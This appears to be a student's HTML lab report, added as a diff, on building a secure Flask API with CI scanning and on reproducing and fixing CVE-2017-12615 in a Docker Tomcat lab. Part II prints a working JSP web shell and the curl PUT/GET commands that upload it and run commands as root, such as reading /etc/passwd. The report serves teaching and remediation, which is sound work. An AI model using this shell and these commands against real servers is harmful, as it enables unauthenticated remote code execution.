@@ -1,0 +1,690 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Internet Security — Laboratory Work No. 1</title>
+<style>
+  @page { size: A4; margin: 18mm 17mm 18mm 17mm; }
+  * { box-sizing: border-box; }
+  body {
+    font-family: "Segoe UI", Arial, sans-serif;
+    font-size: 10.5pt;
+    line-height: 1.5;
+    color: #1b1b1b;
+    margin: 0;
+  }
+  h1 { font-size: 20pt; color: #0b3d63; margin: 0 0 6pt 0; }
+  h2 { font-size: 15pt; color: #0b3d63; border-bottom: 2px solid #0b3d63;
+       padding-bottom: 3pt; margin-top: 20pt; }
+  h3 { font-size: 12pt; color: #14507d; margin-top: 14pt; }
+  p { margin: 6pt 0; text-align: justify; }
+  ul, ol { margin: 5pt 0 5pt 18pt; padding: 0; }
+  ul { list-style-type: disc; }
+  li { margin: 3pt 0; }
+  li::marker { color: #0b3d63; }
+  table { border-collapse: collapse; width: 100%; margin: 8pt 0; font-size: 9.5pt; }
+  th, td { border: 1px solid #9aa7b1; padding: 4pt 6pt; vertical-align: top; }
+  th { background: #dce9f3; text-align: left; }
+  code, pre {
+    font-family: Consolas, "Courier New", monospace;
+    font-size: 9pt;
+  }
+  code { background: #f1f3f5; padding: 1pt 3pt; border-radius: 2pt; }
+  pre {
+    background: #f6f8fa;
+    border: 1px solid #d0d7de;
+    border-left: 4px solid #0b3d63;
+    padding: 8pt 10pt;
+    white-space: pre-wrap;
+    word-break: break-word;
+    margin: 8pt 0;
+  }
+  .cover {
+    height: 245mm;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    text-align: center;
+    page-break-after: always;
+  }
+  .cover .university { font-size: 15pt; letter-spacing: 2pt; color: #0b3d63; }
+  .cover .course { font-size: 12pt; color: #444; margin-top: 4pt; }
+  .cover .workno { font-size: 16pt; margin-top: 55pt; color: #333; }
+  .cover .title { font-size: 25pt; font-weight: bold; color: #0b3d63;
+                  margin: 16pt 40pt 0 40pt; line-height: 1.25; }
+  .cover .meta { margin-top: 60pt; font-size: 12.5pt; line-height: 2.0; }
+  .cover .meta b { display: inline-block; width: 150pt; text-align: right;
+                   margin-right: 10pt; color: #333; }
+  .cover .date { margin-top: 45pt; color: #444; }
+  .page-break { page-break-before: always; }
+  .caption { font-size: 9pt; color: #555; text-align: center;
+             margin: -3pt 0 10pt 0; font-style: italic; }
+  .note {
+    background: #fff8e1; border: 1px solid #e0c56e;
+    padding: 7pt 10pt; margin: 8pt 0; font-size: 9.5pt;
+  }
+  .toc { margin-top: 10pt; }
+  .toc li { margin: 4pt 0; }
+  .term-img { display: block; width: 100%; border: 1px solid #333; margin: 6pt 0 2pt 0; }
+  .small { font-size: 9pt; color: #555; }
+  .badge { color: #1a7f37; font-weight: bold; }
+</style>
+</head>
+<body>
+
+<!-- ============================ TITLE PAGE ============================ -->
+<div class="cover">
+  <div class="university">HANGZHOU DIANZI UNIVERSITY</div>
+  <div class="course">Internet Security — Laboratory Work</div>
+
+  <div class="workno">Laboratory Work No. 1</div>
+  <div class="title">Secure REST API Development with<br>CI/CD and Real CVE Vulnerability Analysis</div>
+
+  <div class="meta">
+    <div><b>Variant:</b> [Variant N]</div>
+    <div><b>Surname and Name:</b> [Surname Name]</div>
+    <div><b>HDU number:</b> 23320308</div>
+  </div>
+
+  <div class="date">October 2026</div>
+</div>
+
+<!-- ============================ TOC ============================ -->
+<h1>Contents</h1>
+<ol class="toc">
+  <li>Purpose of the Work</li>
+  <li>Part I — Secure REST API
+    <ol>
+      <li>Technology stack and project layout</li>
+      <li>API endpoints</li>
+      <li>Implemented security measures</li>
+      <li>Testing</li>
+      <li>CI/CD security pipeline</li>
+    </ol>
+  </li>
+  <li>Part II — CVE-2017-12615: Reproduction, Root Cause and Fix
+    <ol>
+      <li>Selected vulnerability</li>
+      <li>Vulnerable environment</li>
+      <li>Reproduction of the attack</li>
+      <li>Root-cause analysis</li>
+      <li>Applied protection measures</li>
+      <li>Verification of the fix and regression testing</li>
+    </ol>
+  </li>
+  <li>Answers to Control Questions</li>
+  <li>Conclusion</li>
+  <li>Appendix — Repository, Pipeline and Fix Folder</li>
+</ol>
+
+<!-- ============================ 1 PURPOSE ============================ -->
+<h2 class="page-break">1. Purpose of the Work</h2>
+<p>
+The purpose of this laboratory work is to gain practical experience in the full
+security lifecycle of a backend application: designing protection against the
+OWASP Top 10, integrating automated security checks into CI/CD, reproducing a
+known real-world CVE in a controlled environment, identifying its root cause,
+applying a fix, and verifying that the fix both eliminates the attack and does
+not break normal functionality.
+</p>
+<p>
+The work consists of two connected parts. Part I implements a secure REST API
+with Flask, parameterized database access, output escaping, bcrypt password
+hashing and JWT authentication, and runs static and dependency security scans
+on every push. Part II uses Vulhub and Docker to reproduce
+<strong>CVE-2017-12615</strong> against Apache Tomcat 8.5.19, analyses the
+configuration and input-handling weaknesses that make the attack possible, and
+verifies a remediation based on a patched release and secure configuration.
+</p>
+
+<!-- ============================ 2 PART I ============================ -->
+<h2 class="page-break">2. Part I — Secure REST API</h2>
+
+<h3>2.1 Technology stack and project layout</h3>
+<table>
+  <tr><th>Layer</th><th>Choice</th></tr>
+  <tr><td>Language / framework</td><td>Python 3.12+ / Flask 3.1</td></tr>
+  <tr><td>Database</td><td>SQLite through SQLAlchemy ORM (Flask-SQLAlchemy)</td></tr>
+  <tr><td>Authentication</td><td>JWT (PyJWT, HS256) and bcrypt password hashes</td></tr>
+  <tr><td>Tests</td><td>pytest, pytest-cov</td></tr>
+  <tr><td>CI/CD</td><td>GitHub Actions</td></tr>
+  <tr><td>SAST / SCA</td><td>Bandit / pip-audit</td></tr>
+</table>
+<p>
+The public repository is
+<strong>https://github.com/ynjlzxpl/hdu-internet-security-work1</strong>.
+The application factory is in <code>app/__init__.py</code>; the two blueprints
+are <code>app/auth.py</code> and <code>app/api.py</code>; security helpers are in
+<code>app/security.py</code>; the models are in <code>app/models.py</code>; the
+31 automated tests are under <code>tests/</code>.
+</p>
+
+<h3>2.2 API endpoints</h3>
+<table>
+  <tr><th>Method</th><th>Path</th><th>Authentication</th><th>Description</th></tr>
+  <tr><td>POST</td><td><code>/auth/login</code></td><td>No</td>
+      <td>Validate username/password and issue a JWT.</td></tr>
+  <tr><td>GET</td><td><code>/api/data</code></td><td>Bearer JWT</td>
+      <td>List notes owned by the authenticated user; optional
+          <code>?search=</code> filter.</td></tr>
+  <tr><td>GET</td><td><code>/api/data/&lt;id&gt;</code></td><td>Bearer JWT</td>
+      <td>Read one note, only if it belongs to the caller.</td></tr>
+  <tr><td>POST</td><td><code>/api/data</code></td><td>Bearer JWT</td>
+      <td>Third, self-chosen endpoint: create a note for the caller.</td></tr>
+  <tr><td>GET</td><td><code>/api/users/me</code></td><td>Bearer JWT</td>
+      <td>Return the authenticated user's profile.</td></tr>
+  <tr><td>GET</td><td><code>/health</code></td><td>No</td>
+      <td>Liveness probe.</td></tr>
+</table>
+<p>A successful login returns an access token:</p>
+<pre>POST /auth/login
+{"username": "alice", "password": "AliceDemo123!"}
+
+200 OK
+{"access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+ "token_type": "Bearer", "expires_in": 3600}</pre>
+<p>Protected data is retrieved with the token:</p>
+<pre>GET /api/data
+Authorization: Bearer &lt;access_token&gt;</pre>
+<p>
+Calling any protected endpoint without a token, with a tampered signature, with
+an expired token, or with an <code>alg=none</code> token returns
+<code>401 Unauthorized</code>. Notes that belong to another user are returned as
+<code>404</code>, so the API does not reveal their existence.
+</p>
+
+<h3>2.3 Implemented security measures</h3>
+
+<h4>SQL injection protection</h4>
+<ul>
+  <li>All database access uses the SQLAlchemy ORM
+      (<code>select(...).where(...)</code>, <code>db.session.get(...)</code>).
+      No SQL statement is built by string concatenation, and no interpolated
+      <code>text()</code> query exists in the application.</li>
+  <li>The search filter binds its value as a query parameter:
+      <code>Note.title.ilike(pattern)</code>. Quotes, <code>--</code> and
+      <code>OR 1=1</code> in the value are therefore treated as data, never as
+      SQL syntax.</li>
+  <li>Every note query includes <code>Note.owner_id == g.current_user.id</code>.
+      This is both an access-control control and a structural protection
+      against injection that would otherwise return other users' rows.</li>
+  <li>Input is validated before use: usernames must match
+      <code>^[A-Za-z0-9_.-]{3,32}$</code>; password length is bounded; search is
+      truncated to 100 characters; note fields are type- and length-checked.</li>
+  <li>The login lookup itself uses a bound ORM comparison. Payloads such as
+      <code>alice' OR '1'='1</code> are rejected by the username whitelist and
+      cannot authenticate.</li>
+</ul>
+
+<h4>Cross-site scripting (XSS) protection</h4>
+<ul>
+  <li>Every user-controlled string is escaped at the output boundary with
+      Flask's built-in <code>markupsafe.escape()</code> through
+      <code>app.security.sanitize()</code>, used when notes and profiles are
+      serialised. Stored data remains intact; the response contains
+      <code>&amp;lt;script&amp;gt;</code> instead of executable markup.</li>
+  <li>Responses are JSON only, sent with
+      <code>Content-Type: application/json</code>; input is never reflected into
+      an HTML document.</li>
+  <li>Defence-in-depth headers are added to every response:
+      <code>X-Content-Type-Options: nosniff</code>,
+      <code>X-Frame-Options: DENY</code>,
+      <code>Referrer-Policy: no-referrer</code>, and
+      <code>Content-Security-Policy: default-src 'none'; frame-ancestors 'none'</code>.</li>
+  <li>Request bodies are limited to 16 KiB and note fields to 120/5000
+      characters, reducing resource-exhaustion payloads.</li>
+</ul>
+<p>
+A test creates a note with the title
+<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>. The response contains
+<code>&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;</code>;
+the raw <code>&lt;script&gt;</code> tag never appears in the output.
+</p>
+
+<h4>Authentication and password storage</h4>
+<ul>
+  <li><strong>bcrypt</strong> with a per-password salt and cost factor 12.
+      Only the hash is stored; plaintext is never persisted or logged.
+      bcrypt's 72-byte limit is enforced explicitly.</li>
+  <li><strong>JWT issuing:</strong> a successful login returns an HS256 token
+      with <code>sub</code>, <code>iss</code>, <code>iat</code> and
+      <code>exp</code> claims. The default lifetime is one hour.</li>
+  <li><strong>JWT middleware:</strong> the <code>@jwt_required</code> decorator
+      requires the Bearer scheme, verifies the HMAC signature, uses an explicit
+      algorithm allow-list (rejecting <code>alg=none</code> and algorithm
+      confusion), validates the issuer, requires all four claims, rejects
+      expired tokens, and loads the user from the database. Tokens for deleted
+      users fail.</li>
+  <li><strong>No user enumeration:</strong> an unknown username triggers a dummy
+      bcrypt verification and receives exactly the same status and message as a
+      wrong password. Login responses use <code>Cache-Control: no-store</code>.</li>
+  <li><strong>Brute-force throttling:</strong> five failed attempts per 60
+      seconds for the same IP/username pair; further attempts return
+      <code>429</code> with <code>Retry-After</code>.</li>
+  <li><strong>Secret management:</strong> <code>JWT_SECRET</code> comes from the
+      environment; with <code>APP_ENV=production</code> the application refuses
+      to start without it. Development only uses an ephemeral random fallback.</li>
+  <li><strong>Broken access control:</strong> note IDs are always combined with
+      the authenticated owner, preventing horizontal privilege escalation
+      (IDOR).</li>
+</ul>
+
+<h3>2.4 Testing</h3>
+<p>
+The test suite is executed with <code>pytest -q --cov=app --cov-report=term-missing</code>.
+It contains <strong>31 tests</strong> and reaches <strong>85% statement
+coverage</strong> (100% of <code>api.py</code>, <code>auth.py</code> and
+<code>models.py</code>). The tests cover:
+</p>
+<ul>
+  <li>successful login and JWT claims; wrong password and unknown user (same
+      generic response); malformed requests;</li>
+  <li>missing, Basic-scheme, tampered, expired, <code>alg=none</code> and
+      deleted-user tokens;</li>
+  <li>bcrypt storage (hash prefix and verification) and login rate limiting;</li>
+  <li>SQL-injection payloads in login and search, including the owner-filter
+      guarantee;</li>
+  <li>XSS payload escaping in create and list responses;</li>
+  <li>note ownership checks, validation, oversized bodies, 404/405 JSON
+      handling, and security headers.</li>
+</ul>
+
+<h3>2.5 CI/CD security pipeline</h3>
+<p>
+The workflow <code>.github/workflows/ci.yml</code> runs on every push and pull
+request to <code>main</code> (and can be started manually). It has three jobs:
+</p>
+<table>
+  <tr><th>Job</th><th>Tool</th><th>Action</th></tr>
+  <tr><td>Tests</td><td>pytest + coverage</td>
+      <td>Runs the full suite; uploads <code>coverage.xml</code>.</td></tr>
+  <tr><td>SAST</td><td>Bandit</td>
+      <td>Static analysis of <code>app/</code>; fails on medium/high findings;
+          uploads <code>bandit-report.txt</code>.</td></tr>
+  <tr><td>SCA</td><td>pip-audit</td>
+      <td>Audits pinned dependencies against PyPI/OSV vulnerability data;
+          fails on any known vulnerability; uploads
+          <code>pip-audit-report.json</code>.</td></tr>
+</table>
+<p>
+Latest results: <span class="badge">all three jobs passed</span>.
+Bandit report: <strong>No issues identified</strong> — 0 low, 0 medium, 0 high
+(508 lines scanned). pip-audit: <strong>12 dependencies audited, 0 with known
+vulnerabilities</strong>.
+</p>
+<p>
+Last successful pipeline run:
+<strong>https://github.com/ynjlzxpl/hdu-internet-security-work1/actions/runs/39352597970</strong>
+</p>
+
+<img class="term-img" src="../docs/screenshots/ci-run-summary.png"
+     alt="Successful CI run with Tests, SAST and SCA jobs">
+<div class="caption">Figure 1. CI run summary: Tests (pytest), SAST (Bandit) and SCA (pip-audit) all succeeded.</div>
+
+<img class="term-img" src="../docs/screenshots/sast-bandit.png"
+     alt="Bandit SAST job steps">
+<div class="caption">Figure 2. SAST job (Bandit): all steps, including “Run Bandit static analysis”, completed successfully.</div>
+
+<img class="term-img" src="../docs/screenshots/sca-pip-audit.png"
+     alt="pip-audit SCA job steps">
+<div class="caption">Figure 3. SCA job (pip-audit): dependency audit completed successfully.</div>
+
+<!-- ============================ 3 PART II ============================ -->
+<h2 class="page-break">3. Part II — CVE-2017-12615: Reproduction, Root Cause and Fix</h2>
+
+<h3>3.1 Selected vulnerability</h3>
+<table>
+  <tr><th>Property</th><th>Value</th></tr>
+  <tr><td>CVE</td><td><strong>CVE-2017-12615</strong> — Apache Tomcat
+      DefaultServlet PUT / JSP upload remote code execution</td></tr>
+  <tr><td>CVSS v3.1</td><td><strong>8.1 High</strong>
+      (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)</td></tr>
+  <tr><td>Vulnerable component</td><td>Apache Tomcat <code>DefaultServlet</code>,
+      HTTP PUT support, with the <code>readonly</code> initialisation parameter
+      set to <code>false</code></td></tr>
+  <tr><td>Affected releases</td><td>Per NVD, Tomcat 7.0.0–7.0.79 on Windows;
+      the same PUT/JSP-upload weakness is demonstrated by Vulhub on Tomcat
+      8.5.19. The related bypass <strong>CVE-2017-12617</strong> affects
+      8.5.0–8.5.22 and was fixed in 8.5.23.</td></tr>
+  <tr><td>Vulhub path</td><td><code>tomcat/CVE-2017-12615</code></td></tr>
+  <tr><td>Impact</td><td>Unauthenticated file write into the web root,
+      followed by JSP execution as the Tomcat user (root in this container).</td></tr>
+</table>
+<p>
+The vulnerability was chosen because the reproduction is short (a build plus two
+HTTP requests), the principle is easy to explain (an insecure DefaultServlet
+configuration combined with an incomplete file-extension check), and the
+impact is unambiguous: remote code execution. It also complements the SQLi/XSS
+protection work in Part I because it demonstrates an input-handling flaw in a
+widely deployed web container.
+</p>
+
+<h3>3.2 Vulnerable environment</h3>
+<p>
+The environment is the official Vulhub compose file at
+<code>vulhub/tomcat/CVE-2017-12615</code>. Its Dockerfile starts from Tomcat
+8.5.19 and injects an insecure <code>readonly=false</code> parameter into
+<code>conf/web.xml</code>:
+</p>
+<pre>&lt;init-param&gt;
+  &lt;param-name&gt;readonly&lt;/param-name&gt;
+  &lt;param-value&gt;false&lt;/param-value&gt;
+&lt;/init-param&gt;</pre>
+<p>
+The container is started with:
+</p>
+<pre>docker compose -f vulhub/tomcat/CVE-2017-12615/docker-compose.yml \
+  --project-directory vulhub/tomcat/CVE-2017-12615 up -d --build</pre>
+<div class="note">
+<strong>Note on the image source.</strong> The configured Docker Hub mirrors
+returned 403/allowlist errors for <code>vulhub/tomcat:8.5.19</code>, so the
+official <code>tomcat:8.5.19-jre8</code> image was pulled and locally tagged as
+<code>vulhub/tomcat:8.5.19</code>. The Vulhub Dockerfile was used unchanged and
+therefore still injects the same <code>readonly=false</code> configuration.
+The vulnerable behaviour is identical.
+</div>
+<p>Confirmed environment properties:</p>
+<pre>Server version: Apache Tomcat/8.5.19
+Server built:   Jul 24 2017 21:01:14 UTC
+
+119:&lt;init-param&gt;&lt;param-name&gt;readonly&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;
+
+$ docker exec ... id
+uid=0(root) gid=0(root) groups=0(root)</pre>
+
+<h3>3.3 Reproduction of the attack</h3>
+<p>
+The attacker needs network access to port 8080 and does not need any
+credentials. The payload is a small JSP page that executes a command passed in
+the <code>cmd</code> parameter:
+</p>
+<pre>&lt;%@ page contentType="text/plain;charset=UTF-8" pageEncoding="UTF-8" %&gt;
+&lt;%@ page import="java.io.*" %&gt;
+&lt;%
+    String cmd = request.getParameter("cmd");
+    if (cmd != null &amp;&amp; cmd.length() &gt; 0) {
+        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
+        InputStream in = p.getInputStream();
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        byte[] buf = new byte[4096];
+        int n;
+        while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
+        response.getWriter().print(out.toString("UTF-8"));
+    }
+%&gt;</pre>
+
+<p><strong>Step 1 — upload the JSP.</strong> The request targets
+<code>/shell.jsp/</code> with a trailing slash. Tomcat's extension check does
+not treat the path as a <code>.jsp</code> write, but the filesystem removes the
+trailing separator and creates <code>shell.jsp</code> in the web root.</p>
+<pre>curl -i -X PUT "http://127.0.0.1:8080/shell.jsp/" \
+     --data-binary "@shell.jsp" \
+     -H "Content-Type: application/octet-stream"
+
+HTTP/1.1 201</pre>
+
+<p><strong>Step 2 — execute commands.</strong> A GET request compiles and runs
+the uploaded page. Because the container runs Tomcat as root, the command
+executes as root.</p>
+<pre>curl "http://127.0.0.1:8080/shell.jsp?cmd=id"
+uid=0(root) gid=0(root) groups=0(root)
+
+curl -G "http://127.0.0.1:8080/shell.jsp" \
+     --data-urlencode "cmd=cat /etc/passwd"
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+
+curl -G "http://127.0.0.1:8080/shell.jsp" \
+     --data-urlencode "cmd=touch /tmp/pwned_by_cve_2017_12615; ls -l /tmp/pwned_by_cve_2017_12615"
+-rw-r----- 1 root root 0 Oct 20 02:21 /tmp/pwned_by_cve_2017_12615</pre>
+
+<img class="term-img" src="../docs/screenshots/cve-vulnerable.png"
+     alt="Terminal output of the successful CVE-2017-12615 reproduction">
+<div class="caption">Figure 4. Actual output of the reproduction: PUT returns 201, the JSP executes as root, /etc/passwd is read and a marker file is created.</div>
+
+<h3>3.4 Root-cause analysis</h3>
+<p>
+The vulnerability is not caused by a single missing quote or a malformed SQL
+query; it is the combination of an insecure configuration and an incomplete
+validation check:
+</p>
+<ol>
+  <li><strong>PUT is enabled on the default servlet.</strong>
+      <code>DefaultServlet</code> is mapped to <code>/</code>, so it serves the
+      web root. Its secure default is <code>readonly=true</code>. The Vulhub
+      Dockerfile explicitly inserts <code>readonly=false</code>, which turns on
+      the servlet's <code>PUT</code>/<code>DELETE</code> write operations.
+      This is the primary configuration error: a read-only file-serving
+      component is changed into an unauthenticated file-upload interface.</li>
+  <li><strong>The dangerous-extension check is incomplete.</strong>
+      Tomcat tries to prevent direct upload of executable files by rejecting
+      names ending in <code>.jsp</code>. The check is performed on the request
+      path, without reconciling it with the path that the operating system
+      will actually create. A trailing <code>/</code> (and, on other systems,
+      encoded separators or <code>::$DATA</code>) bypasses the suffix test,
+      while the filesystem normalises the trailing separator away. The file
+      is therefore written as <code>shell.jsp</code>, exactly the dangerous
+      type the check was supposed to block. This is a canonicalisation /
+      input-validation flaw (CWE-434, unrestricted upload of a dangerous file
+      type).</li>
+  <li><strong>The uploaded file is executable by design.</strong>
+      The file lands in <code>webapps/ROOT</code>. A later GET is served by the
+      JSP servlet, which compiles and executes it. There is no separate
+      authentication or authorisation step for this execution.</li>
+  <li><strong>The process runs as root.</strong> The official Tomcat image runs
+      the JVM as root, so a web-shell upload escalates directly to root inside
+      the container. This is an aggravating factor rather than the root cause,
+      but it turns a web-application flaw into full control of the container.</li>
+</ol>
+<p>
+In our own words: the server was configured to accept write requests it should
+never accept, and the only protection left — a filename suffix blacklist — was
+bypassed because the server checked one representation of the path while the
+filesystem used another. The result is an unauthenticated write of an
+executable JSP into a directory that the server later executes.
+</p>
+
+<h3>3.5 Applied protection measures</h3>
+<p>
+The fix, stored in <code>vulhub-fix/</code>, combines the vendor's version fix
+with the correct configuration:
+</p>
+<ol>
+  <li><strong>Upgrade Tomcat.</strong> The fixed environment uses
+      <code>tomcat:8.5.23-jre8</code>. Tomcat 8.5.23 contains the fix for
+      CVE-2017-12617, the bypass of the CVE-2017-12615 remediation
+      (affected 8.5.0–8.5.22). Using a patched release protects against the
+      bypass even if similar mistakes are made again.</li>
+  <li><strong>Remove the insecure configuration.</strong> The fixed Dockerfile
+      does not insert <code>readonly=false</code>. <code>DefaultServlet</code>
+      therefore keeps its secure default <code>readonly=true</code>, and PUT
+      and DELETE are rejected.</li>
+  <li><strong>Defence in depth (recommended for production).</strong> Keep PUT
+      disabled on static-file servlets; run the servlet container as a
+      non-root user; place an upload/WAF control in front of the application;
+      monitor the web root for unexpected files; and apply the same
+      version-plus-configuration check to all Tomcat instances.</li>
+</ol>
+<pre>--- Dockerfile (vulnerable)
++++ Dockerfile (fixed)
+@@
+-FROM vulhub/tomcat:8.5.19
+-
+-RUN cd /usr/local/tomcat/conf \
+-    &amp;&amp; LINE=$(nl -ba web.xml | grep '&lt;load-on-startup&gt;1' | awk '{print $1}') \
+-    &amp;&amp; ADDON="&lt;init-param&gt;&lt;param-name&gt;readonly&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;" \
+-    &amp;&amp; sed -i "$LINE i $ADDON" web.xml
++FROM tomcat:8.5.23-jre8
++# readonly remains at its secure default (true); PUT/DELETE are rejected.</pre>
+<p>
+The folder contains <code>Dockerfile</code>, <code>docker-compose.yml</code>,
+<code>diff.patch</code> and a short <code>README.md</code> with the run and
+verification commands.
+</p>
+
+<h3>3.6 Verification of the fix and regression testing</h3>
+<p>
+The vulnerable container was stopped with <code>docker compose down</code>, the
+fixed environment was rebuilt with <code>up -d --build</code>, and exactly the
+same exploitation steps were repeated:
+</p>
+<pre>Server version: Apache Tomcat/8.5.23
+no readonly init-param (secure default true)
+
+PUT /shell.jsp/                     -> HTTP/1.1 403 Forbidden
+GET  /shell.jsp?cmd=id              -> HTTP 404
+GET  /                              -> HTTP 200   (regression)
+GET  /docs/                         -> HTTP 200   (regression)</pre>
+<p>
+The PUT request is now rejected by <code>DefaultServlet</code> before any file
+is written, so the JSP never enters the web root and the subsequent GET returns
+404. The default Tomcat page and the documentation webapp still return 200,
+which confirms that normal read functionality was not damaged by the upgrade or
+the configuration change. This is the required regression test.
+</p>
+
+<img class="term-img" src="../docs/screenshots/cve-fixed.png"
+     alt="Terminal output showing the fixed environment rejecting the attack">
+<div class="caption">Figure 5. Same attack against the fixed environment: PUT 403, webshell 404, while normal pages still return 200.</div>
+
+<!-- ============================ 4 CONTROL QUESTIONS ============================ -->
+<h2 class="page-break">4. Answers to Control Questions</h2>
+
+<h3>1. Why is password hashing with bcrypt preferable to SHA-256?</h3>
+<p>
+SHA-256 is a fast general-purpose hash. An attacker who obtains a password
+database can test billions of candidate passwords per second on GPUs; unsalted
+hashes additionally allow rainbow-table lookups. bcrypt is deliberately slow,
+uses a unique random salt per password, and has an adjustable cost factor, so
+each guess is expensive and precomputed tables are useless. The cost can be
+raised as hardware becomes faster. This makes offline brute-force and
+credential-stuffing attacks much less practical.
+</p>
+
+<h3>2. What is the main difference between SAST and DAST?</h3>
+<p>
+SAST (Static Application Security Testing) analyses source code or bytecode
+without executing the program. It is white-box, can run early in development,
+and can point to the exact line of a flaw, but it produces false positives and
+cannot see runtime configuration. DAST (Dynamic Application Security Testing)
+tests a running application from the outside, like an attacker. It is
+black-box, finds runtime and configuration issues and real exploitability, but
+it cannot see the source, gives less precise remediation guidance, and
+requires a deployed application.
+</p>
+
+<h3>3. How does a JWT token work, what information does it contain, and how does the server verify its authenticity?</h3>
+<p>
+A JWT consists of three Base64URL-encoded parts: header, payload and signature.
+The header names the signing algorithm (for example HS256); the payload carries
+claims such as <code>sub</code> (user id), <code>iss</code> (issuer),
+<code>iat</code> (issued-at) and <code>exp</code> (expiration). The payload is
+encoded, not encrypted, so it must not contain secrets. The signature is
+computed over the header and payload with a server-side secret (HMAC) or a
+private key (RSA/ECDSA). On each request the server recomputes and compares the
+signature with the configured algorithm, validates the issuer, requires the
+mandatory claims, and checks that the token has not expired. Our middleware
+also rejects <code>alg=none</code> by using an explicit algorithm allow-list.
+</p>
+
+<h3>4. What risks arise if you do not audit third-party libraries?</h3>
+<p>
+Dependencies can contain known vulnerabilities (for example Log4Shell), can be
+compromised in a supply-chain attack, can pull in vulnerable transitive
+packages, or can have licence and maintenance problems. Without an SCA process
+the organisation may ship a vulnerable component for months, may not know what
+is actually deployed, and cannot prioritise patching. Our pipeline runs
+<code>pip-audit</code> on every push so that a newly disclosed advisory fails
+the build, and all dependencies are pinned for reproducibility.
+</p>
+
+<h3>5. What advantages do Docker and Vulhub provide for studying cybersecurity compared with installing vulnerable software directly?</h3>
+<p>
+Containers isolate the vulnerable service from the host, so a compromise or a
+destructive test does not damage the student's machine. The environment is
+reproducible and version-pinned, can be rebuilt or destroyed in seconds, and
+can be run on any machine with Docker. Vulhub provides ready-made compose files
+and documented CVEs, which removes hours of setup and lets the student focus on
+the vulnerability. Direct installation pollutes the host, risks exposing the
+vulnerable service on the network, and is difficult to reproduce exactly.
+</p>
+
+<h3>6. Describe the difference between a vulnerability and an exploit. What were you reproducing in this work?</h3>
+<p>
+A vulnerability is a weakness in software or configuration (for example,
+DefaultServlet accepting PUT with <code>readonly=false</code> and an incomplete
+suffix check). An exploit is the concrete technique or input that takes
+advantage of that weakness (the PUT request with a trailing slash and a JSP
+payload, followed by a GET that executes it). In this work we reproduced the
+exploit against a deliberately vulnerable Tomcat 8.5.19 container to
+demonstrate the underlying vulnerability and its impact.
+</p>
+
+<h3>7. Why is it critically important to check that the main functionality of the application has not been damaged after applying a fix (regression testing)?</h3>
+<p>
+Security fixes often change request parsing, file handling or configuration.
+A patch that blocks the attack but also breaks legitimate requests is not an
+acceptable fix. Regression testing proves that both requirements hold: the
+malicious request is rejected and normal functionality still works. In our
+verification the malicious PUT returned 403 and the webshell returned 404,
+while the default page and the documentation webapp still returned 200. Without
+this check we could have “fixed” the service by breaking it.
+</p>
+
+<h3>8. How does knowledge and the ability to reproduce known CVEs help a security specialist (for example, a pentester or SOC analyst)?</h3>
+<p>
+Reproducing a CVE builds a concrete understanding of the attacker's sequence of
+actions, the affected versions and the observable artefacts. A pentester can
+validate exposure and demonstrate impact to a client instead of reporting a
+theoretical finding. A SOC analyst can write and test detection rules against
+the real traffic, distinguish false positives, and prioritise alerts. Incident
+responders can recognise the exploitation pattern, and defenders can verify
+that a patch or WAF rule actually blocks the attack. It also supports risk
+prioritisation and secure configuration baselines.
+</p>
+
+<!-- ============================ 5 CONCLUSION ============================ -->
+<h2>5. Conclusion</h2>
+<p>
+Part I produced a working, tested Flask API that applies the main OWASP
+protections: ORM-based parameterized queries, output escaping, bcrypt password
+storage, JWT authentication with strict verification, ownership checks, input
+validation and security headers. Thirty-one tests pass with 85% coverage, and a
+three-job GitHub Actions pipeline runs the tests, Bandit SAST and pip-audit SCA
+on every push with zero findings.
+</p>
+<p>
+Part II reproduced CVE-2017-12615 in an isolated Vulhub/Docker environment. The
+attack required only an unauthenticated PUT request and a GET request, yet it
+produced root-level command execution because Tomcat was configured with
+<code>readonly=false</code> and the servlet's JSP-suffix check was bypassed by a
+trailing slash. The fix upgrades Tomcat to 8.5.23 and removes the insecure
+configuration. Repeating the same attack against the fixed environment returns
+403 for the PUT and 404 for the webshell, while normal pages still return 200.
+The exercise demonstrates that configuration errors and incomplete input
+validation can be as dangerous as code-level bugs, and that an effective
+remediation must be verified against both the exploit and the application's
+legitimate functionality.
+</p>
+
+<!-- ============================ APPENDIX ============================ -->
+<h2>6. Appendix — Repository, Pipeline and Fix Folder</h2>
+<table>
+  <tr><th>Item</th><th>Location</th></tr>
+  <tr><td>Public repository</td>
+      <td>https://github.com/ynjlzxpl/hdu-internet-security-work1</td></tr>
+  <tr><td>README (project, API, security, CVE)</td>
+      <td>README.md in the repository root</td></tr>
+  <tr><td>Last successful pipeline</td>
+      <td>https://github.com/ynjlzxpl/hdu-internet-security-work1/actions/runs/39352597970</td></tr>
+  <tr><td>Fix folder</td><td>vulhub-fix/ (Dockerfile, docker-compose.yml,
+      diff.patch, README.md)</td></tr>
+  <tr><td>CVE evidence</td><td>docs/cve/evidence/ (raw command output);
+      docs/screenshots/cve-vulnerable.png, cve-fixed.png</td></tr>
+  <tr><td>CI evidence</td><td>docs/screenshots/ci-run-summary.png,
+      sast-bandit.png, sca-pip-audit.png; docs/ci/ reports</td></tr>
+</table>
+
+</body>
+</html>
